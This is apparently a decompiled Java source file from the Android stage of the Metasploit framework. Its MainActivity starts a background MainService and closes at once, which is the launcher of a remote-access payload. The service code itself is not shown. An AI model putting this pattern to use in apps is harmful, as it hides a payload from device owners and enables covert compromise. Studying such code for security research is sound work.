package com.metasploit.stage;

import android.app.Activity;
import android.os.Bundle;

public class MainActivity extends Activity {
    /* Access modifiers changed, original: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        MainService.startService(this);
        finish();
    }
}
